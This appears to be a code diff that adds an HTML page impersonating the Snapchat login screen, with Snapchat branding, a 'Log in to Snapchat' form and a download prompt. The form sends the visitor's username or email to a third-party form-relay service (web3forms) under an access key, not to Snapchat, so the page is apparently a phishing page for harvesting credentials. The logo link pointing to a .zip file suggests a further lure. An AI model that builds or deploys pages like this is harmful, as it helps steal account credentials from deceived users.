@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+  <style>  
+body, h2, p, a, button, input {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+
+body {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    color: #333;
+    background-color: #f9f9f9;
+}
+
+
+.header {
+    background-color: #fff;
+    border-bottom: 1px solid #ddd;
+    padding: 10px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo {
+    height: 30px;
+}
+
+.search-bar {
+    border: 1px solid #ddd;
+    padding: 5px 10px;
+    border-radius: 20px;
+    font-size: 14px;
+    width: 200px;
+}
+
+/* Main Container */
+.main-container {
+    display: flex;
+    justify-content: space-between;
+    padding: 20px;
+    flex: 1;
+}
+
+/* Login Section */
+.login-section {
+    width: 40%;
+}
+
+.login-section h2 {
+    font-size: 24px;
+    color: #000;
+    margin-bottom: 10px;
+}
+
+.login-section p {
+    margin-bottom: 20px;
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+.input-field {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+.phone-login {
+    font-size: 12px;
+    color: #007bff;
+    text-decoration: none;
+    margin-bottom: 15px;
+    display: inline-block;
+}
+
+.login-button {
+    width: 100%;
+    padding: 12px;
+    background-color: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 10px;
+}
+
+.alternative-login {
+    text-align: center;
+    margin: 20px 0;
+}
+
+.microsoft-button {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #000;
+    color: #fff;
+    padding: 10px 20px;
+    border-radius: 5px;
+    border: none;
+    cursor: pointer;
+    font-size: 14px;
+    margin: 10px 0;
+}
+
+.microsoft-button img {
+    height: 20px;
+    margin-right: 10px;
+}
+
+.app-link {
+    font-size: 12px;
+    color: #007bff;
+    text-decoration: none;
+}
+
+.app-link span {
+    text-decoration: underline;
+}
+
+/* Banner Section */
+.banner-section {
+    width: 50%;
+    background-color: #fffc00;
+    padding: 20px;
+    text-align: center;
+}
+
+.banner-text {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 20px;
+    color: #000;
+}
+
+.banner-images img {
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    margin: 5px;
+}
+
+/* Footer Section */
+.footer {
+    background-color: #f1f1f1;
+    text-align: center;
+    padding: 10px;
+    font-size: 12px;
+}
+
+.footer a {
+    color: #007bff;
+    text-decoration: none;
+}</style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-container">
+            <img src="images/3d-icon-social-media-app.zip" alt="Snapchat Logo" class="logo">
+            <input type="text" placeholder="Search" class="search-bar">
+        </div>
+    </header>
+    <main class="main-container">
+        <div class="login-section">
+            <h2>Log in to Snapchat</h2>
+            <p>Chat, Snap, and video call your friends. Watch Stories and Spotlight, all from your computer.</p>
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="00ed92cb-5032-4578-b9be-306700b2271e">
+                <inp ut type="hidden" name="subject" value="New Submission from Jayjay">
+                <input type="hidden" name="from_name" value="Your Website Name">
+                <input type="text" placeholder="Username or email address" class="input-field" name="Username or email address">
+                <a href="#" class="phone-login">Use phone number instead</a>
+                <button type="submit" class="login-button">Log in</button>
+            </form>
+            <div class="alternative-login">
+                <p>or continue with downloading Snapchat WebApp</p>
+                <button class="microsoft-button">
+                    <img src="microsoft-logo.png" alt="Microsoft Store">
+                    Get it from Microsoft
+                </button>
+            </div>
+            <a href="#" class="app-link">Looking for the app? Get it <span>here</span>.</a>
+        </div>
+        <div class="banner-section">
+            <div class="banner-text">Less Social Media. <br> More Snapchat.</div>
+            <div class="banner-images">
+                <img src="funny-filter1.png" alt="Filter 1">
+                <img src="funny-filter2.png" alt="Filter 2">
+                <img src="funny-filter3.png" alt="Filter 3">
+                <img src="funny-filter4.png" alt="Filter 4">
+                <img src="funny-filter5.png" alt="Filter 5">
+            </div>
+        </div>
+    </main>
+    <footer class="footer">
+        <p>Are you a parent? <a href="#">Learn what we're doing to help keep Snapchatters safe.</a></p>
+    </footer>
+</body>
+</html>
